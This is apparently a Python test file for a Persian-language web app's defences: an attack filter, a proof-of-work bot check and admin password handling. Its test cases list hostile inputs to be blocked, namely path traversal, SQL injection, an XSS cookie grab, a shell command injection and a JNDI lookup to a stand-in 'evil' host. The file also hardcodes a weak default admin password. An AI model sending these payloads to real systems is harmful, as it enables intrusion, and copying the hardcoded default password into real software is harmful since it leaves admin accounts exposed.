"""آزمون‌های امنیتی: سد تهاجم، انسان‌سنجی و گذرواژهٔ مدیریت."""
from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

from web import guard  # noqa: E402
from web import security  # noqa: E402


class AttackFilterTest(unittest.TestCase):
    """الگوهای حمله باید رد شوند و متن فارسی معمولی رد نشود."""

    def test_blocks_common_attacks(self):
        cases = [
            dict(path="/.env"),
            dict(path="/wp-login.php"),
            dict(path="/index.php"),
            dict(path="/../../etc/passwd"),
            dict(query="?q=1 union select password from users"),
            dict(body="<script>alert(document.cookie)</script>"),
            dict(body="id=1' OR '1'='1"),
            dict(body="; cat /etc/passwd"),
            dict(body="${jndi:ldap://evil}"),
            dict(user_agent="sqlmap/1.7.2"),
            dict(method="TRACE"),
        ]
        for case in cases:
            verdict = guard.screen(**case)
            self.assertTrue(verdict.blocked, f"رد نشد: {case}")
            self.assertTrue(verdict.rule)

    def test_allows_normal_traffic(self):
        cases = [
            dict(path="/"),
            dict(path="/api/chat"),
            dict(path="/static/assets/brand/orb-live.webp"),
            dict(query="?q=تهران"),
            dict(body='{"message": "سلام، حالت چطور است؟"}'),
            dict(body='{"message": "قیمت ۳ تا ۵ تومان است"}'),
            dict(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
        ]
        for case in cases:
            self.assertFalse(guard.screen(**case).blocked, f"اشتباه رد شد: {case}")

    def test_strike_ban(self):
        book = guard.StrikeBook(limit=3, seconds=60)
        self.assertEqual(book.banned("10.0.0.9"), 0)
        self.assertFalse(book.hit("10.0.0.9")[0])
        self.assertFalse(book.hit("10.0.0.9")[0])
        banned, wait = book.hit("10.0.0.9")
        self.assertTrue(banned)
        self.assertGreater(wait, 0)
        self.assertGreater(book.banned("10.0.0.9"), 0)
        book.reset("10.0.0.9")
        self.assertEqual(book.banned("10.0.0.9"), 0)

    def test_stats_shape(self):
        data = guard.stats()
        for key in ("recent", "total_today", "by_rule", "top_ips", "rules"):
            self.assertIn(key, data)
        self.assertIsInstance(data["rules"], list)


class HumanCheckTest(unittest.TestCase):
    """«من ربات نیستم» باید واقعاً سنجیده شود، نه تیک ظاهری."""

    def setUp(self):
        self.hc = security.HumanCheck(bits=10)

    def proof(self, fp="", evidence=None):
        challenge = self.hc.issue(fp)
        nonce = self.hc.solve(challenge["salt"], challenge["bits"])
        return challenge, nonce

    def test_valid_proof_with_evidence(self):
        challenge, nonce = self.proof("fp-1")
        ok, reason = self.hc.assess(challenge["token"], nonce,
                                    {"moves": 12, "keys": 5, "elapsed_ms": 2200}, "fp-1")
        self.assertTrue(ok, reason)

    def test_token_is_single_use(self):
        challenge, nonce = self.proof("fp-1")
        ev = {"moves": 9, "keys": 2, "elapsed_ms": 1800}
        self.assertTrue(self.hc.assess(challenge["token"], nonce, ev, "fp-1")[0])
        ok, reason = self.hc.assess(challenge["token"], nonce, ev, "fp-1")
        self.assertFalse(ok)
        self.assertEqual(reason, "invalid_proof")

    def test_bound_to_browser(self):
        challenge, nonce = self.proof("browser-a")
        ok, reason = self.hc.assess(challenge["token"], nonce,
                                    {"moves": 8, "keys": 3, "elapsed_ms": 1500}, "browser-b")
        self.assertFalse(ok)
        self.assertEqual(reason, "invalid_proof")

    def test_rejects_instant_and_empty_submit(self):
        challenge, nonce = self.proof("fp")
        ok, reason = self.hc.assess(challenge["token"], nonce,
                                    {"moves": 0, "keys": 0, "elapsed_ms": 120}, "fp")
        self.assertFalse(ok)
        self.assertEqual(reason, "too_fast")

    def test_rejects_honeypot_and_webdriver(self):
        ch1, n1 = self.proof("fp")
        self.assertEqual(self.hc.assess(ch1["token"], n1,
                                        {"moves": 8, "keys": 2, "elapsed_ms": 1800,
                                         "honeypot": "http://spam"}, "fp"), (False, "honeypot"))
        ch2, n2 = self.proof("fp")
        self.assertEqual(self.hc.assess(ch2["token"], n2,
                                        {"moves": 8, "keys": 2, "elapsed_ms": 1800,
                                         "webdriver": True}, "fp"), (False, "automation"))

    def test_fingerprint_is_coarse_and_stable(self):
        a = security.fingerprint("192.168.4.11", "UA")
        b = security.fingerprint("192.168.4.99", "UA")
        c = security.fingerprint("10.0.0.1", "UA")
        self.assertEqual(a, b)
        self.assertNotEqual(a, c)

    def test_difficulty_rises_after_failures(self):
        hc = security.HumanCheck(bits=12)
        self.assertEqual(hc.difficulty_bonus("fp"), 0)
        hc.note_failure("fp")
        hc.note_failure("fp")
        self.assertGreater(hc.difficulty_bonus("fp"), 0)
        self.assertGreater(hc.issue("fp", bonus=hc.difficulty_bonus("fp"))["bits"], 12)

    def test_wrong_nonce_fails(self):
        challenge, _ = self.proof("fp")
        ok, reason = self.hc.assess(challenge["token"], "0",
                                    {"moves": 8, "keys": 2, "elapsed_ms": 1800}, "fp")
        self.assertFalse(ok)


class AdminDefaultPasswordTest(unittest.TestCase):
    """گذرواژهٔ مدیریت همان چیزی است که مالک خواسته."""

    def test_default_password_value(self):
        import importlib
        from web import admin
        importlib.reload(admin)
        self.assertEqual(admin.DEFAULT_PASSWORD, "13911391")

    def test_can_set_eight_character_password(self):
        from web import admin
        old = os.environ.get("RAYAN_ADMIN_FILE")
        with tempfile.TemporaryDirectory() as tmp:
            os.environ["RAYAN_ADMIN_FILE"] = os.path.join(tmp, "admin.json")
            try:
                import importlib
                admin = importlib.reload(admin)
                admin.set_admin_password("13911391")
                self.assertTrue(admin.using_default_password())
            finally:
                if old is None:
                    os.environ.pop("RAYAN_ADMIN_FILE", None)
                else:
                    os.environ["RAYAN_ADMIN_FILE"] = old
                importlib.reload(admin)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
